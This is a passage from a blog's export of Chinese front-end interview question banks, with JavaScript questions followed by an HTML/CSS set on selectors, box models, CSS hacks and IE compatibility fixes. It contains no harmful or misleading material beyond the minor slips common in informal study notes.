num1+num2&quot;); 30、Javascript创建对象的几种方式1)、var obj = {};（使用json创建对象） 12345var obj = &#123;&#125;;obj.name = &apos;张三&apos;;obj.action = function ()&#123; alert(&apos;吃饭&apos;);&#125;; 2)、var obj = new Object();（使用Object创建对象） 12345var obj = new Object();obj.name = &apos;张三&apos;;obj.action = function ()&#123; alert(&apos;吃饭&apos;);&#125;; 3)、通过函数创建对象。 (a)、使用 this 关键字，如： 1234567var obj = function () &#123; this.name =&apos;张三&apos;; this.age = 19; this.action = function () &#123; alert(&apos;吃饭&apos;); &#125;;&#125; (b)、使用 prototype 关键字，如： 12345function obj ()&#123;&#125;obj.prototype.name =&apos;张三&apos;;obj.prototype.action = function ()&#123; alert(&apos;吃饭&apos;);&#125;; 4)、通过Window创建对象，如： 12345window.name = &apos;张三&apos;;window.age = 19;window.action = function() &#123; alert(&apos;吃饭&apos;);&#125;; 5)、使用内置对象创建对象。如： 1234var str = new String(&quot;实例初始化String&quot;);var str1 = &quot;直接赋值的String&quot;;var func = new Function(&quot;x&quot;,&quot;alert(x)&quot;);//示例初始化funcvar obj = new Object();//示例初始化一个Object 31、iframe的优缺点？优点： 解决加载缓慢的第三方内容如图标和广告等的加载问题Security sandbox并行加载脚本 缺点： iframe会阻塞主页面的Onload事件即时内容为空，加载也需要时间没有语意 32、Cookie 缺点： Cookie数量和长度的限制。每个domain最多只能有20条cookie，每个cookie长度不能超过4KB，否则会被截掉。安全性问题。如果cookie被人拦截了，那人就可以取得所有的session信息。即使加密也与事无补，因为拦截者并不需要知道cookie的意义，他只要原样转发cookie就可以达到目的了。有些状态不可能保存在客户端。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。 33、js延迟加载的方式有哪些 defer和async动态创建DOM方式（创建script，插入到DOM中，加载完毕后callBack）按需异步载入js 34、documen.write 和 innerHTML 的区别 document.write 只能重绘整个页面innerHTML 可以重绘页面的一部分 35、哪些操作会造成内存泄漏 内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。 setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。 闭包 控制台日志 循环（在两个对象彼此引用且彼此保留时，就会产生一个循环） 36、事件委托是什么 利用事件冒泡的原理，让自己的所触发的事件，让其父元素代替执行！ 37、闭包是什么，有什么特性，对页面有什么影响 闭包就是能够读取其他函数内部变量的函数。在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。 123456789function outer()&#123; var num = 1; function inner()&#123; var n = 2; alert(n + num); &#125; return inner;&#125;outer()(); 闭包资料 38、解释 jsonp 的原理，以及为什么不是真正的 ajax 动态创建script标签，回调函数Ajax是页面无刷新请求数据操作 39、 字符串反转，如将 ‘12345678’ 变成 ‘87654321’思路：先将字符串转换为数组 split()，利用数组的反序函数 reverse()颠倒数组，再利用 jion() 转换为字符串 12var str = &apos;12345678&apos;;str = str.split(&apos;&apos;).reverse().join(&apos;&apos;); 40、将数字 12345678 转化成 RMB 形式 如： 12,345,678思路：先将数字转为字符， str= str + ‘’ ;利用反转函数，每三位字符加一个 ‘,’最后一位不加； re()是自定义的反转函数，最后再反转回去！ 1234567891011121314function re(str) &#123; str += &apos;&apos;; return str.split(&quot;&quot;).reverse().join(&quot;&quot;);&#125;function toRMB(num) &#123; var tmp=&apos;&apos;; for (var i = 1; i &lt;= re(num).length; i++) &#123; tmp += re(num)[i - 1]; if (i % 3 == 0 &amp;&amp; i != re(num).length) &#123; tmp += &apos;,&apos;; &#125; &#125; return re(tmp);&#125; 41、window.location.search() 返回的是什么？ 查询(参数)部分。除了给动态语言赋值以外，我们同样可以给静态页面,并使用 javascript 来获得相信应的参数值返回值：?ver=1.0&amp;id=timlq 也就是问号后面的！ 42、window.location.hash 返回的是什么？ 锚点 返回值：#love 43、window.location.reload() 作用？ 刷新当前页面 44、Javascript 中的垃圾回收机制？ 在Javascript中，如果一个对象不再被引用，那么这个对象就会被GC回收。如果两个对象互相引用，而不再 被第3者所引用，那么这两个互相引用的对象也会被回收。因为函数a被b引用，b又被a外的c引用，这就是为什么 函数a执行后不会被回收的原因。 45、为什么不能定义 1px 左右的 div 容器IE6下这个问题是因为默认的行高造成的，解决的方法也有很多，例如： overflow:hidden | zoom:0.08| line-height:1px]]></content>
      <categories>
        <category>题库系列</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[题库-HTML、CSS篇]]></title>
    <url>%2F2016%2F04%2F08%2F%E9%A2%98%E5%BA%93-HTML%E3%80%81CSS%E7%AF%87%2F</url>
    <content type="text"><![CDATA[1、浏览器的内核 IE: trident内核Firefox：gecko内核Safari:webkit内核Opera:以前是presto内核，Opera现已改用Google Chrome的Blink内核Chrome:Blink(基于webkit，Google与Opera Software共同开发) 2、Doctype &lt;!DOCTYPE&gt; 声明位于文档中的最前面的位置，处于 标签之前。此标签可告知浏览器文档使用哪种 HTML 或 XHTML 规范。重点：告知浏览器该以何种模式来渲染文档DOCTYPE不存在或格式不正确会导致文档以混杂模式呈现。 3、Quirks 模式和 Standards 模式区别 从IE6开始，引入了Standards模式，标准模式中，浏览器尝试给符合标准的文档在规范上的正确处理达到在指定浏览器中的程度；在IE6之前CSS还不够成熟，所以IE5等之前的浏览器对CSS的支持很差， IE6将对CSS提供更好的支持，然而这时的问题就来了；因为有很多页面是基于旧的布局方式写的，而如果IE6 支持CSS则将令这些页面显示不正常，如何在即保证不破坏现有页面，又提供新的渲染机制呢；在写程序时我们也会经常遇到这样的问题，如何保证原来的接口不变，又提供更强大的功能，尤其是新功能不兼容旧功能时；遇到这种问题时的一个常见做法是增加参数和分支，即当某个参数为真时，我们就使用新功能，而如果这个参数 不为真时，就使用旧功能，这样就能不破坏原有的程序，又提供新功能；IE6也是类似这样做的，它将DTD当成了这个“参数”，因为以前的页面大家都不会去写DTD，所以IE6就假定如果写了DTD，就意味着这个页面将采用对CSS支持更好的布局，而如果没有，则采用兼容之前的布局方式；这就是Quirks模式（怪癖模式，诡异模式，怪异模式）。 区别： 总体会有布局、样式解析和脚本执行三个方面的区别。 盒模型： 在W3C标准中，如果设置一个元素的宽度和高度，指的是元素内容的宽度和高度， 在 Quirks 模式下，IE的宽度和高度还包含了 padding 和 border。 设置行内元素的高宽： 在 Standards 模式下，给等行内元素设置 wdith 和 height 都不会生效， 在 quirks 模式下，则会生效。 设置百分比的高度： 在standards模式下，一个元素的高度是由其包含的内容来决定的，如果父元素没有设置百分比的高度，子元素设置一个百分比的高度是无效的用 margin:0 auto 设置水平居中： 使用 margin:0 auto 在 standards 模式下可以使元素水平居中，但在quirks模式下却会失效。 4、div+css的布局较table布局的优点 改版的时候更方便，只要改css文件。页面加载速度更快、结构化清晰、页面显示简洁。表现与结构相分离。易于优化（seo）搜索引擎更友好，排名更容易靠前。 5、img 的 alt 与 title 异同 a:alt(alt text):为不能显示图像、窗体或applets的用户代理（UA），alt属性用来指定替换文字；替换文字的语言由 lang 属性指定。在IE浏览器下会在没有 title 时把 alt 当成 tool tip 显示；title(tool tip):该属性为设置该属性的元素提供建议性的信息。 6、strong 与 em 的异同 strong: 粗体强调标签，强调，表示内容的重要性em: 斜体强调标签，更强烈强调，表示内容的强调点 7、渐进增强、优雅降级渐进增强 progressive enhancement： 针对低版本浏览器进行构建页面，保证最基本的功能，然后再针对高级浏览器进行效果、交互等改进和追加功能达到更好的用户体验。 优雅降级 graceful degradation： 一开始就构建完整的功能，然后再针对低版本浏览器进行兼容。 区别： 优雅降级是从复杂的现状开始，并试图减少用户体验的供给；渐进增强则是从一个非常基础的，能够起作用的版本开始，并不断扩充，以适应未来环境的需要。降级（功能衰减）意味着往回看；而渐进增强则意味着朝前看，同时保证其根基处于安全地带。 “优雅降级”观点 “优雅降级”观点认为应该针对那些最高级、最完善的浏览器来设计网站。而将那些被认为“过时”或有功能缺失的浏览器下的测试工作安排在开发周期的最后阶段，并把测试对象限定为主流浏览器（如 IE、Mozilla 等）的前一个版本。在这种设计范例下，旧版的浏览器被认为仅能提供“简陋却无妨 (poor, but passable)” 的浏览体验。你可以做一些小的调整来适应某个特定的浏览器。但由于它们并非我们所关注的焦点，因此除了修复较大的错误之外，其它的差异将被直接忽略。 “渐进增强”观点则认为应关注于内容本身。内容是我们建立网站的诱因。有的网站展示它，有的则收集它，有的寻求，有的操作，还有的网站甚至会包含以上的种种，但相同点是它们全都涉及到内容。这使得“渐进增强”成为一种更为合理的设计范例。这也是它立即被 Yahoo! 所采纳并用以构建其“分级式浏览器支持 (Graded Browser Support)”策略的原因所在。 IE6,7,8网页效果相对高版本现代浏览器少了很多圆角，阴影（CSS3），要求兼容（使用图片背景，放弃CSS3），如何解决？ 8、为什么利用多个域名来存储网站资源会更有效 CDN缓存更方便突破浏览器并发限制节约cookie带宽节约主域名的连接数，优化页面响应速度防止不必要的安全问题 9、对网页标准和标准制定机构重要性 网页标准和标准制定机构都是为了能让web发展的更‘健康’，开发者遵循统一的标准，降低开发难度，开发成本，SEO也会更好做，也不会因为滥用代码导致各种BUG、安全问题，最终提高网站易用性。 10、cookies，sessionStorage 和 localStorage 的区别sessionStorage 用于本地存储一个会话（session）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。 因此 sessionStorage 不是一种持久化的本地存储，仅仅是会话级别的存储。而 localStorage 用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。 web storage 和 cookie 的区别 Web Storage 的概念和 cookie 相似，区别是它是为了更大容量存储设计的;Cookie的大小是受限的，并且每次你请求一个新的页面的时候 Cookie 都会被发送过去，这样无形中浪费了带宽;cookie 还需要指定作用域，不可以跨域调用;Web Storage 拥有 setItem, getItem, removeItem, clear等方法，cookie 需要前端开发者自己封装 setCookie，getCookie。Cookie 是不可以或缺的：Cookie 的作用是与服务器进行交互，作为 HTTP 规范的一部分而存在;Web Storage 仅仅是为了在本地“存储”数据而生。 11、简述一下 src 与 href 的区别 src 用于替换当前元素，href 用于在当前文档和引用资源之间确立联系。src 是 source 的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求 src 资源时会将其指向的资源下载并应用到文档内，例如 js 脚本，img 图片和 frame 等元素，&lt;script src =”js.js”&gt;&lt;/script&gt;。 当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部。 href 是 Hypertext Reference 的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接，如果我们在文档中添加&lt;link href=”common.css” rel=”stylesheet”/&gt;，那么浏览器会识别该文档为 css 文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用 link 方式来加载 css ，而不是使用 @import 方式。 12、网页制作会用到的图片格式png-8，png-24，jpeg，gif，svg。 Webp：WebP 格式，谷歌（google）开发的一种旨在加快图片加载速度的图片格式。图片压缩体积大约只有 JPEG 的 2/3，并能节省大量的服务器带宽资源和数据空间。Facebook Ebay 等知名网站已经开始测试并使用WebP格式。在质量相同的情况下，WebP 格式图像的体积要比 JPEG 格式图像小 40% 13、什么是微格式及其在前端构建中微格式的考虑 微格式（Microformats）是一种让机器可读的语义化 XHTML 词汇的集合，是结构化数据的开放标准。是为特殊应用而制定的特殊格式。优点：将智能数据添加到网页上，让网站内容在搜索引擎结果界面可以显示额外的提示。应用范例：豆瓣 14、在 css/js 代码上线之后开发人员经常会优化性能，从用户刷新网页开始，一次 js 请求一般情况下有哪些地方会有缓存处理 dns缓存cdn缓存浏览器缓存服务器缓存 15、加载海量图片 图片懒加载，在页面上的未可视区域可以添加一个滚动条事件，判断图片位置与浏览器顶端的距离与页面的距离，如果前者小于后者，优先加载。如果为幻灯片、相册等，可以使用图片预加载技术，将当前展示图片的前一张和后一张优先下载。如果图片为 css 图片，可以使用 CSSsprite，SVGsprite，Iconfont、Base64 等技术。如果图片过大，可以使用特殊编码的图片，加载时会先加载一张压缩的特别厉害的缩略图，以提高用户体验。如果图片展示区域小于图片的真实大小，则因在服务器端根据业务需要先行进行图片压缩，图片压缩后大小与展示一致。 16、HTML结构的语义化 去掉或样式丢失的时候能让页面呈现清晰的结构. html本身是没有表现的，我们看到例如&lt;h1&gt;是粗体，字体大小 2em，加粗；&lt;strong&gt;是加粗的，不要认为这是 html 的表现，这些其实 html 默认的 css 样式在起作用.所以去掉或样式丢失的时候能让页面呈现清晰的结构不是语义化的 HTML 结构的优点.但是浏览器都有有默认样式，默认样式的目的也是为了更好的表达 html 的语义.可以说浏览器的默认样式和语义化的 HTML 结构是不可分割的.屏幕阅读器（如果访客有视障）会完全根据标记来“读”你的网页.例如,如果你使用的含语义的标记,屏幕阅读器就会“逐个拼出”你的单词,而不是试着去对它完整发音.PDA、手机等设备可能无法像普通电脑的浏览器一样来渲染网页（通常是因为这些设备对CSS的支持较弱） 使用语义标记可以确保这些设备以一种有意义的方式来渲染网页. 理想情况下,观看设备的任务是符合设备本身的条件来渲染网页.语义标记为设备提供了所需的相关信息,就省去了你自己去考虑所有可能的显示情况（包括现有的或者将来新的设备）.例如,一部手机可以选择使一段标记了标题的文字以粗体显示.而掌上电脑可能会以比较大的字体来显示.无论哪种方式一旦你对文本标记为标题,您就可以确信读取设备将根据其自身的条件来合适地显示页面. 搜索引擎的爬虫也依赖于标记来确定上下文和各个关键字的权重 过去你可能还没有考虑搜索引擎的爬虫也是网站的“访客”,但现在它们他们实际上是极其宝贵的用户.没有他们的话,搜索引擎将无法索引你的网站,然后一般用户将很难过来访问.你的页面是否对爬虫容易理解非常重要,因为爬虫很大程度上会忽略用于表现的标记,而只注重语义标记.如果页面文件的标题被标记,那么这个页面在搜索结果的位置可能会比较靠后. 除了提升易用性外,语义标记有利于正确使用CSS和JavaScript. 因为其本身提供了许多“钩钩”来应用页面的样式与行为.SEO主要还是靠你网站的内容和外部链接的。 便于团队开发和维护 W3C 给我们定了一个很好的标准，在团队中大家都遵循这个标准，可以减少很多差异化的东西，方便开发和维护，提高开发效率，甚至实现模块化开发。 17、以前端角度出发做好SEO需要考虑什么 了解搜索引擎如何抓取网页和如何索引网页 你需要知道一些搜索引擎的基本工作原理，各个搜索引擎之间的区别，搜索机器人（SE robot 或叫 web crawler）如何进行工作，搜索引擎如何对搜索结果进行排序等等。 Meta标签优化 主要包括主题（Title)，网站描述(Description)，和关键词（Keywords）。还有一些其它的隐藏文字比如Author（作者），Category（目录），Language（编码语种）等。 如何选取关键词并在网页中放置关键词 搜索就得用关键词。 关键词分析和选择是SEO最重要的工作之一。 首先要给网站确定主关键词（一般在5个上下） 针对这些关键词进行优化 关键词密度（Density） 相关度（Relavancy） 突出性（Prominency）等 了解主要的搜索引擎 虽然搜索引擎有很多，但是对网站流量起决定作用的就那么几个。比如英文的主要有Google，Yahoo，Bing等；中文的有百度，搜狗，有道等。不同的搜索引擎对页面的抓取和索引、排序的规则都不一样。还要了解各搜索门户和搜索引擎之间的关系，比如AOL网页搜索用的是Google的搜索技术，MSN用的是Bing的技术。 主要的互联网目录 Open Directory自身不是搜索引擎，而是一个大型的网站目录，他和搜索引擎的主要区别是网站内容的收集方式不同。目录是人工编辑的，主要收录网站主页；搜索引擎是自动收集的，除了主页外还抓取大量的内容页面。 按点击付费的搜索引擎 搜索引擎也需要生存，随着互联网商务的越来越成熟，收费的搜索引擎也开始大行其道。最典型的有 Overture 和百度，当然也包括 Google 的广告项目 Google Adwords。越来越多的人通过搜索引擎的点击广告来定位商业网站，这里面也大有优化和排名的学问，用最少的广告投入获得最多的点击。 搜索引擎登录 网站做完了以后，要让别人找到你，最简单的办法就是将网站提交（submit）到搜索引擎。如果是商业网站，主要的搜索引擎和目录都会要求你付费来获得收录（比如 Yahoo 要299美元）但是好消息是（至少到目前为止）最大的搜索引擎 Google 目前还是免费，而且它主宰着 60％ 以上的搜索市场。 链接交换和链接广泛度（Link Popularity） 网页内容都是以超文本（Hypertext）的方式来互相链接的，网站之间也是如此除了搜索引擎以外，人们也每天通过不同网站之间的链接来Surfing（“冲浪”）其它网站到你的网站的链接越多，你也就会获得更多的访问量更重要的是，你的网站的外部链接数越多，会被搜索引擎认为它的重要性越大，从而给你更高的排名 合理的标签使用 18、有哪些方式可以对一个 DOM 设置它的 CSS 样式？ 外部样式表，引入一个外部css文件内部样式表，将css代码放在 标签内部内联样式，将css样式直接定义在 HTML 元素内部 19、CSS 选择器 派生选择器/标签选择器（用 HTML 标签申明, div, h1, p）id选择器（用 DOM 的 ID 申明, #myid）类选择器（用一个样式类名申明, .myclassname）属性选择器（用DOM的属性申明，属于CSS2，IE6不支持，不常用，不知道就算了）除了前3种基本选择器，还有一些扩展选择器，包括后代选择器（利用空格间隔，比如div .a{}）群组选择器（利用逗号间隔，比如p,div,#a{}）相邻选择器（h1 + p）子选择器（ul &gt; li）通配符选择器（ * ）属性选择器（a[rel = “external”]）伪类选择器（a: hover, li: nth - child） CSS3 新增伪类举例： p:first-of-type 选择属于其父元素的首个 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。p:last-of-type 选择属于其父元素的最后 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。p:only-of-type 选择属于其父元素唯一的 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。p:only-child 选择属于其父元素的唯一子元素的每个 &lt;p&gt; 元素。p:nth-child(2) 选择属于其父元素的第二个子元素的每个 &lt;p&gt; 元素。:enabled、:disabled 控制表单控件的禁用状态。:checked 单选框或复选框被选中。 可继承： font-size font-family color, UL LI DL DD DT;不可继承 ：border padding margin width height ;优先级就近原则，样式定义最近者为准; 载入样式以最后载入的定位为准; CSS选择器的优先级是怎么样定义的? !important &gt; id &gt; class &gt; tag important 比 内联优先级高。 基本原则：一般而言，选择器越特殊，它的优先级越高。也就是选择器指向的越准确，它的优先级就越高。 复杂的计算方法： 用1表示派生选择器的优先级用10表示类选择器的优先级用100标示ID选择器的优先级div.test1 .span var 优先级 1+10 +10 +1span#xxx .songs li 优先级1+100 + 10 + 1 #xxx li 优先级 100 +1 那么问题来了，看下列代码， 标签内的文字是什么颜色的？ 1234567&lt;style&gt;.classA&#123; color:blue;&#125;.classB&#123; color:red;&#125;&lt;/style&gt;&lt;body&gt;&lt;p class='classB classA'&gt; 123 &lt;/p&gt;&lt;/body&gt; red。与样式定义在文件中的先后顺序有关，即是后面的覆盖前面的，与在&lt;p class=&#39;classB classA&#39;&gt;中的先后关系无关。 20、CSS 中可以通过哪些属性定义，使得一个 DOM 元素不显示在浏览器可视范围内？ 最基本的：设置 display 属性为 none ，或者设置 visibility 属性为 hidden技巧性：设置宽高为 0，设置透明度为 0，设置 z-index 位置在 -1000em 21、超链接访问过后 hover 就样式不出现的问题是什么？如何解决？被点击访问过的超链接样式不在具有 hover 和 active 了； 解决方法是改变CSS属性的排列顺序:L-V-H-A（link, visited, hover, active） 22. 什么是 Css Hack？ie6,7,8 的 hack 分别是什么？针对不同的浏览器写不同的CSS code的过程，就是CSS hack。 示例如下： 12345678910111213 #test&#123; width:300px; height:300px; background-color:blue; /*firefox*/ background-color:red\9; /*all ie*/ background-color:yellow; /*ie8*/ +background-color:pink; /*ie7*/ _background-color:orange; /*ie6*/ &#125; :root #test &#123; background-color:purple\9; &#125; /*ie9*/@media all and (min-width:0px) &#123; #test &#123;background-color:black;&#125; &#125; /*opera*/@media screen and (-webkit-min-device-pixel-ratio:0)&#123; #test &#123;background-color:gray;&#125; &#125; /*chrome and safari*/ 23、行内元素和块级元素区别，行内元素的 padding 和 margin 可设置吗？ 块级元素：div p h1 h2 h3 h4 form ul ol li dl dt dd行内元素: a b br i span input select知名的空元素：br img input link meta鲜为人知的是：area base col command embed keygen param source track wbr 块级元素(block)特性： 总是独占一行，表现为另起一行开始，而且其后的元素也必须另起一行显示;宽度(width)、高度(height)、内边距(padding)和外边距(margin)都可控制; 内联元素(inline)特性： 和相邻的内联元素在同一行;宽度(width)、高度(height)、内边距的 top/bottom(padding-top/padding-bottom) 和外边距的 top/bottom(margin-top/margin-bottom) 都不可改变（也就是 padding 和 margin 的 left 和 right 是可以设置的），就是里面文字或图片的大小。 那么问题来了，浏览器还有默认的天生 inline-block 元素（拥有内在尺寸，可设置高宽，但不会自动换行），有哪些？ &lt;input&gt; 、&lt;img&gt; 、&lt;button&gt; 、&lt;texterea&gt; 、&lt;label&gt; 内联元素(inline element) a – 锚点 abbr – 缩写 acronym – 首字 b – 粗体(不推荐) big – 大字体 br – 换行 em – 强调 font – 字体设定(不推荐) i – 斜体 img – 图片 input – 输入框 label – 表格标签 s – 中划线(不推荐) select – 项目选择 small – 小字体文本 span – 常用内联容器，定义文本内区块 strike – 中划线 strong – 粗体强调 sub – 下标 sup – 上标 textarea – 多行文本输入框 tt – 电传文本 u – 下划线 var – 定义变量 块级元素 address – 地址 blockquote – 块引用 center – 举中对齐块 dir – 目录列表 div – 常用块级容易，也是css layout的主要标签 dl – 定义列表 fieldset – form控制组 form – 交互表单 h1 – 大标题 h2 – 副标题 h3 – 3级标题 h4 – 4级标题 h5 – 5级标题 h6 – 6级标题 hr – 水平分隔线 isindex – input prompt menu – 菜单列表 noframes – frames可选内容，（对于不支持frame的浏览器显示此区块内容） noscript – ）可选脚本内容（对于不支持script的浏览器显示此内容） ol – 排序表单 p – 段落 pre – 格式化文本 table – 表格 ul – 非排序列表 24、外边距重叠、重叠的结果外边距重叠就是 margin-collapse。在CSS当中，相邻的两个盒子（可能是兄弟关系也可能是祖先关系）的外边距可以结合成一个单独的外边距。这种合并外边距的方式被称为折叠，并且因而所结合成的外边距称为折叠外边距。 折叠结果遵循下列计算规则： 两个相邻的外边距都是正数时，折叠结果是它们两者之间较大的值。两个相邻的外边距都是负数时，折叠结果是两者绝对值的较大值。两个外边距一正一负时，折叠结果是两者的相加的和。 25、rgba() 和 opacity 的透明效果的不同 rgba() 和 opacity 都能实现透明效果最大的不同是 opacity 作用于元素，以及元素内的所有内容的透明度；rgba() 只作用于元素的颜色或其背景色。设置 rgba 透明的元素的子元素不会继承透明效果。 26、css中可以让文字在垂直和水平方向上重叠的两个属性是什么？ 垂直方向：line-height水平方向：letter-spacing 关于 letter-spacing 的巧妙使用： 可以用于消除inline-block元素间的换行符空格间隙问题。 如何垂直居中一个浮动元素 方法一：已知元素的高宽 12345678910#div1&#123; background-color: #6699FF; width: 200px; height: 200px; position: absolute; /* 父元素需要相对定位 */ top: 50%; left: 50%; margin-top: -100px ; /* 二分之一的height，width */ margin-left: -100px; &#125; //方法二:未知元素的高宽 123456789#div1&#123; background-color: #6699FF; margin:auto; position: absolute; /* 父元素需要相对定位 */ left: 0; top: 0; right: 0; bottom: 0; &#125; 如何垂直居中一个&lt;img&gt;用更简便的方法。 123456#container /* &lt;img&gt;的容器设置如下 */&#123; display:table-cell; text-align:center; vertical-align:middle;&#125; 27、px 和 em 的区别px 和 em 都是长度单位。 区别是： px 的值是固定的，指定是多少就是多少，计算比较容易。em 得值不是固定的，并且 em 会继承父级元素的字体大小。浏览器的默认字体高都是 16px 。所以未经调整的浏览器都符合: 1em = 16px。那么 12px = 0.75em, 10px = 0.625em。 28、一个 reset 的 CSS 文件如何使用。normalize.css 是什么，有什么不同 重置样式非常多，凡是一个前端开发人员肯定有一个常用的重置 CSS 文件并知道如何使用它们。原因是不同的浏览器对一些元素有不同的默认样式，如果不处理，在不同的浏览器下会存在必要的风险，或者更有戏剧性的性发生。可能会用 Normalize 来代替你的重置样式文件。它没有重置所有的样式风格，但仅提供了一套合理的默认样式值。既能让众多浏览器达到一致和合理，但又不扰乱其他的东西（如粗体的标题）。在这一方面，无法做每一个复位重置。它也确实有些超过一个重置，它处理了怪癖，像 HTML 的 audio 元素不一致或 line-height 不一致。 29、Sass、LESS是 CSS 预处理器，是 CSS 上的一种抽象层，是一种特殊的语法/语言编译成 CSS。例如 Less 是一种动态样式语言. 将 CSS 赋予了动态语言的特性：如变量，继承，运算，函数. LESS 既可以在客户端上运行 (支持IE 6+, Webkit, Firefox)，也可一在服务端运行 (借助 Node.js)。 为什么要使用它们？ 结构清晰，便于扩展。可以方便地屏蔽浏览器私有语法差异。这个不用多说，封装对浏览器语法差异的重复处理，减少无意义的机械劳动。可以轻松实现多重继承。完全兼容 CSS 代码，可以方便地应用到老项目中。LESS 只是在 CSS 语法上做了扩展，所以老的 CSS 代码也可以与 LESS 代码一同编译。 30、display:none 与visibility:hidden 的区别 display : 隐藏对应的元素但不挤占该元素原来的空间。visibility: 隐藏对应的元素并且挤占该元素原来的空间。 使用 display:none 属性后，HTML 元素（对象）的宽度、高度等各种属性值都将”丢失”;使用 visibility: hidden 属性后，HTML 元素（对象）仅仅是在视觉上看不见（完全透明），它所占据的空间位置仍然存在。 31、CSS 中 link 和 @import 的区别 Link 属于 html 标签，而 @import 是 CSS 中提供的在页面加载的时候，link 会同时被加载，而 @import 引用的 CSS 会在页面加载完成后才会加载引用的 CSS@import 只有在 ie5 以上才可以被识别，而 link 是 html 标签，不存在浏览器兼容性问题Link 引入样式的权重大于 @import 的引用（ @import 是将引用的样式导入到当前的页面中）@import 导入的样式不能使用 js 修改 32、盒模型CSS盒模型有两种：IE盒模型、标准的 W3C 盒模型模型 盒模型：内容、内边距、外边距（一般不计入盒子实际宽度）、边框 33、初始化样式的原因 由于浏览器兼容的问题，不同的浏览器对标签的默认样式值不同，若不初始化会造成不同浏览器之间的显示差异但是初始化 CSS 会对搜索引擎优化造成小影响。 34、BFC 块级格式化上下文BFC 是指浏览器中创建了一个独立的渲染区域，该区域内所有元素的布局不会影响到区域外元素的布局，这个渲染区域只对块级元素起作用 一个创建了新的 BFC 的盒子是独立布局的，盒子内元素的布局不会影响盒子外面的元素。在同一个BFC中的两个相邻的盒子在垂直方向发生margin重叠的问题； 35、html语义化 当页面样式加载失败的时候能够让页面呈现出清晰的结构有利于 seo 优化，利于被搜索引擎收录（更便于搜索引擎的爬虫程序来识别）便于项目的开发及维护，使 html 代码更具有可读性，便于其他设备解析。 36、严格模式与混杂模式的区别？ 严格模式下： 页面排版及 JS 解析是以该浏览器支持的最高标准来执行 混杂模式： 不严格按照标准执行，主要用来兼容旧的浏览器，向后兼容 页面以宽松的向后兼容的方式显示。模拟老式浏览器的行为以防止站点无法工作。 37、IE 的双边距 BUG出现条件：IE6、块级元素、float、横向margin，出现问题：e6 显示的 横向的 margin 放大两倍。解决办法：加入_display：inline 38. HTML 与 XHTML 区别 所有的标记都必须要有一个相应的结束标记 所有标签的元素和属性的名字都必须使用小写 所有的 XML 标记都必须合理嵌套 所有的属性必须用引号 “” 括起来 把所有 &lt; 和 &amp; 特殊符号用编码表示 给所有属性赋一个值 不要在注释内容中使用 “–” 图片必须有说明文字 39、html常见兼容性问题 IE6.7 下的双边距 BUG 块级元素浮动有 margin 值引起的。使用 display: inline 解决标准浏览器下，子元素不会撑开父级元素设置好的宽度，在 IE6 下会撑开。解决办法：计算精准IE6.7 下元素浮动如果宽度需要内容撑开，就给里面块的元素都加浮动IE6.7 下元素通过浮动并在一行，就给两个元素都加浮动，不要给第二个元素加 margin-left最小高度问题，小于 19px 当做 19px 处理。解决方法：overflow: hiddenIE6 下 1px 的点线不支持。解决方法：切背景图平铺IE6.7 下，li 本身没有浮动，但内容有浮动，li 下面就会产生间隙。解决办法：给父级元素加宽度并清浮动，li 加 vertical: top;IE6.7 下最小高度问题和 li 下间隙问题并存时给 li 加浮动，加宽度，加 overflow: hidden;IE6.7 下的文字溢出 bug，子元素宽度和父级元素宽度相差小于3像素，在两个浮动元素之间有注释或者内嵌元素时。解决：用&lt;div&gt;&lt;/div&gt; 包起来IE6.7 下当浮动元素和绝对定位元素是并列关系，绝对定位元素会消失。解决：在定位元素外套 &lt;div&gt;&lt;/div&gt;3像素问题 使用float引起的 使用dislpay:inline -3px超链接 hover 点击后失效 使用正确的书写顺序 link visited hover activeIe z-index问题 给父级添加 position:relativePng 透明 使用js代码 改Min-height 最小高度 ！Important 解决select 在ie6下遮盖 使用 iframe 嵌套为什么没有办法定义 1px 左右的宽度容器（IE6默认的行高造成的，使用 over:hidden, zoom:0.08 line-height:1px）IE5-8不支持 opacity，解决办法： 12345.opacity &#123; opacity: 0.4 filter: alpha(opacity=60); /* for IE5-7 */ -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=60)"; /* for IE 8*/&#125; png24为的图片在iE6浏览器上出现背景，解决方案是做成 PNG8. 浏览器默认的 margin 和 padding 不同。解决方案是加一个全局的 *{margin:0;padding:0;} 来统一。_display:inline;将其转化为行内属性。(_这个符号只有ie6会识别) 渐进识别的方式，从总体中逐渐排除局部。 首先，巧妙的使用“\9”这一标记，将IE游览器从所有情况中分离出来。 接着，再次使用“+”将IE8和IE7、IE6分离开来，这样IE8已经独立识别。 123456.bb&#123; background-color:#f1ee18;/*所有识别*/ .background-color:#00deff\9; /*IE6、7、8识别*/ +background-color:#a200ff;/*IE6、7识别*/ _background-color:#1e0bd1;/*IE6识别*/&#125; IE下,可以使用获取常规属性的方法来获取自定义属性, 也可以使用 getAttribute() 获取自定义属性;Firefox下,只能使用 getAttribute() 获取自定义属性. 解决方法: 统一通过 etAttribute() 获取自定义属性.IE下,even 对象有 x, y 属性,但是没有 pageX, pageY 属性;Firefox下, event 对象有 pageX, pageY 属性,但是没有 x, y 属性.（条件注释）缺点是在IE浏览器下可能会增加额外的HTTP请求数。Chrome 中文界面下默认会将小于 12px 的文本强制按照 12px 显示, 可通过加入 CSS 属性 -webkit-text-size-adjust: none; 解决.IE6不支持PNG透明背景，解决办法: 